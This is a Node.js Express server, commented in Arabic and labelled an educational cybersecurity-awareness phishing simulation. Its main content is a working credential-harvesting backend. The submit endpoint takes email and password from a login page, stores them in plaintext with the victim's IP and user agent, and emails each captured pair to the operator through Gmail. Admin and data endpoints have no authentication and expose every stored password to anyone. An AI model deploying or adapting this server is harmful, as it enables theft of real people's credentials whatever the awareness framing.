// ===================================================
// مشروع التوعية بالأمن السيبراني - الخادم الرئيسي
// هذا المشروع للأغراض التعليمية والتوعوية فقط
// ===================================================

const express = require('express');
const nodemailer = require('nodemailer');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const cors = require('cors');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// ===================================================
// ⚠️ إعدادات البريد الإلكتروني - يرجى تعديلها
// ===================================================
const EMAIL_CONFIG = {
  myEmail: 'YOUR_EMAIL@gmail.com',       // ← بريدك الإلكتروني الذي ستستلم عليه
  appPassword: 'YOUR_APP_PASSWORD',       // ← كلمة مرور التطبيق من Google Account Settings
  enabled: false,                         // ← غيّرها إلى true بعد تعديل البيانات أعلاه
};

// ===================================================
// قاعدة البيانات (ملف JSON محلي)
// ===================================================
const DB_FILE = path.join(__dirname, 'database.json');

function readDB() {
  if (!fs.existsSync(DB_FILE)) {
    fs.writeFileSync(DB_FILE, JSON.stringify({ records: [] }, null, 2), 'utf8');
  }
  return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
}

function writeDB(data) {
  fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2), 'utf8');
}

function findRecord(id) {
  const db = readDB();
  return db.records.find(r => r.id === id) || null;
}

function insertRecord(record) {
  const db = readDB();
  db.records.push(record);
  writeDB(db);
}

function updateRecord(id, updates) {
  const db = readDB();
  const record = db.records.find(r => r.id === id);
  if (!record) return null;
  Object.assign(record, updates);
  writeDB(db);
  return record;
}

function deleteRecord(id) {
  const db = readDB();
  const before = db.records.length;
  db.records = db.records.filter(r => r.id !== id);
  writeDB(db);
  return db.records.length < before;
}

// ===================================================
// إعداد Nodemailer
// ===================================================
let transporter = null;
if (EMAIL_CONFIG.enabled && EMAIL_CONFIG.myEmail !== 'YOUR_EMAIL@gmail.com') {
  transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: EMAIL_CONFIG.myEmail,
      pass: EMAIL_CONFIG.appPassword,
    },
  });
}

// ===================================================
// Middleware
// ===================================================
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// ===================================================
// API: استقبال وتخزين البيانات من صفحة الدخول
// ===================================================
app.post('/api/submit', async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ success: false, message: 'بيانات ناقصة' });
  }

  const sessionId = uuidv4();
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';
  const userAgent = req.headers['user-agent'] || 'غير معروف';
  const timestamp = new Date().toISOString();

  // الحالة الابتدائية: waiting (ينتظر موافقة الأدمن لإطلاق التوعية)
  insertRecord({
    id: sessionId,
    email,
    password,
    ip,
    user_agent: userAgent,
    timestamp,
    candidate: null,
    status: 'waiting' // waiting | triggered | deleted
  });

  console.log(`[+] بيانات مسجلة جديدة: ${email} | ${timestamp}`);

  // إرسال بريد إلكتروني فوري (إذا مُفعَّل)
  if (transporter) {
    try {
      await transporter.sendMail({
        from: EMAIL_CONFIG.myEmail,
        to: EMAIL_CONFIG.myEmail,
        subject: '🔔 [توعية] بيانات جديدة تم التقاطها',
        html: `
          <div dir="rtl" style="font-family: Arial, sans-serif; padding: 20px; background: #f5f5f5; border-radius: 8px;">
            <h2 style="color: #d32f2f;">⚠️ مشروع التوعية بالأمن السيبراني</h2>
            <p>تم التقاط بيانات جديدة في محاكاة التصيد:</p>
            <table style="width:100%; border-collapse:collapse; background:white; border-radius:8px;">
              <tr style="background:#1a73e8; color:white;">
                <th style="padding:12px; text-align:right;">الحقل</th>
                <th style="padding:12px; text-align:right;">القيمة</th>
              </tr>
              <tr><td style="padding:10px;border-bottom:1px solid #eee;"><b>البريد</b></td><td style="padding:10px;border-bottom:1px solid #eee;color:#1a73e8;">${email}</td></tr>
              <tr><td style="padding:10px;border-bottom:1px solid #eee;"><b>كلمة المرور</b></td><td style="padding:10px;border-bottom:1px solid #eee;color:#d32f2f;font-weight:bold;">${password}</td></tr>
              <tr><td style="padding:10px;border-bottom:1px solid #eee;"><b>IP</b></td><td style="padding:10px;border-bottom:1px solid #eee;">${ip}</td></tr>
              <tr><td style="padding:10px;"><b>الوقت</b></td><td style="padding:10px;">${new Date(timestamp).toLocaleString('ar-SA')}</td></tr>
            </table>
            <p style="color:#888; font-size:12px; margin-top:16px;">مشروع توعوي تعليمي — يمكنك إطلاق شاشة التوعية للضحية من لوحة الأدمن.</p>
          </div>
        `,
      });
      console.log(`[✉] بريد أُرسل إلى ${EMAIL_CONFIG.myEmail}`);
    } catch (emailErr) {
      console.warn('[!] تعذر إرسال البريد:', emailErr.message);
    }
  }

  res.json({ success: true, sessionId });
});

// ===================================================
// API: تسجيل تصويت المرشح من صفحة vote.html
// ===================================================
app.post('/api/vote', (req, res) => {
  const { id, candidate } = req.body;
  if (!id || !candidate) {
    return res.status(400).json({ success: false, message: 'بيانات التصويت ناقصة' });
  }

  const record = updateRecord(id, {
    candidate,
    voteTimestamp: new Date().toISOString()
  });

  if (!record) {
    return res.status(404).json({ success: false, message: 'لم يتم العثور على الجلسة' });
  }

  console.log(`[🗳️] صوت المستخدم ${record.email} لصالح: ${candidate}`);
  res.json({ success: true, message: 'تم حفظ التصويت بنجاح' });
});

// ===================================================
// API: فحص حالة الجلسة (لصفحة thankyou.html)
// ===================================================
app.get('/api/status/:id', (req, res) => {
  const record = findRecord(req.params.id);
  if (!record) {
    return res.status(404).json({ success: false, message: 'الجلسة غير موجودة' });
  }

  res.json({
    success: true,
    status: record.status,
    triggered: record.status === 'triggered',
    candidate: record.candidate || 'غير محدد'
  });
});

// ===================================================
// API: جلب بيانات جلسة معينة (لصفحة reveal.html)
// ===================================================
app.get('/api/data/:id', (req, res) => {
  const record = findRecord(req.params.id);
  if (!record) {
    return res.status(404).json({ success: false, message: 'لم يتم العثور على البيانات' });
  }
  res.json({ success: true, data: record });
});

// ===================================================
// API: حذف بيانات جلسة معينة (من طرفية reveal.html)
// ===================================================
app.delete('/api/delete/:id', (req, res) => {
  const existed = findRecord(req.params.id);
  if (!existed) {
    return res.status(404).json({ success: false, message: 'البيانات غير موجودة أو تم حذفها مسبقاً' });
  }

  const deleted = deleteRecord(req.params.id);
  if (!deleted) {
    return res.status(500).json({ success: false, message: 'فشل الحذف' });
  }

  console.log(`[-] تم حذف سجل الضحية: ${req.params.id}`);
  res.json({ success: true, message: 'تم حذف بياناتك بنجاح' });
});

// ===================================================
// API للأدمن: لوحة التحكم المباشرة (admin.html)
// ===================================================

// جلب جميع السجلات للإدارة
app.get('/api/admin/records', (req, res) => {
  const db = readDB();
  res.json({
    success: true,
    records: db.records.slice().reverse(), // الأحدث أولاً
    total: db.records.length,
    waitingCount: db.records.filter(r => r.status === 'waiting').length,
    triggeredCount: db.records.filter(r => r.status === 'triggered').length,
    deletedCount: db.records.filter(r => r.status === 'deleted').length
  });
});

// إطلاق شاشة التوعية لضحية محددة
app.post('/api/admin/trigger/:id', (req, res) => {
  const record = updateRecord(req.params.id, {
    status: 'triggered',
    triggeredAt: new Date().toISOString()
  });

  if (!record) {
    return res.status(404).json({ success: false, message: 'السجل غير موجود' });
  }

  console.log(`[⚡] أطلق الأدمن شاشة التوعية للضحية: ${record.email}`);
  res.json({ success: true, message: 'تم إطلاق شاشة التوعية للضحية' });
});

// إطلاق التوعية لجميع الضحايا المنتظرين
app.post('/api/admin/trigger-all', (req, res) => {
  const db = readDB();
  let count = 0;
  const now = new Date().toISOString();

  db.records.forEach(r => {
    if (r.status === 'waiting') {
      r.status = 'triggered';
      r.triggeredAt = now;
      count++;
    }
  });

  writeDB(db);
  console.log(`[⚡⚡] أطلق الأدمن التوعية لجميع المنتظرين (${count} ضحية)`);
  res.json({ success: true, count, message: `تم إطلاق شاشة التوعية لـ ${count} مستخدم` });
});

// حذف سجل محدد من لوحة الأدمن
app.delete('/api/admin/delete/:id', (req, res) => {
  const deleted = deleteRecord(req.params.id);
  res.json({ success: deleted, message: deleted ? 'تم الحذف' : 'لم يتم العثور على السجل' });
});

// مسح جميع السجلات
app.delete('/api/admin/clear-all', (req, res) => {
  writeDB({ records: [] });
  console.log('[🧹] تم مسح جميع سجلات قاعدة البيانات بواسطة الأدمن');
  res.json({ success: true, message: 'تم تفريغ جميع السجلات بنجاح' });
});

// ===================================================
// تشغيل الخادم
// ===================================================
app.listen(PORT, () => {
  console.log(`
  ╔═════════════════════════════════════════════════════╗
  ║   🛡️  مشروع التوعية بالأمن السيبراني               ║
  ║   الموقع الرئيسي:   http://localhost:${PORT}             ║
  ║   لوحة تحكم الأدمن: http://localhost:${PORT}/admin.html   ║
  ╚═════════════════════════════════════════════════════╝
  `);
});
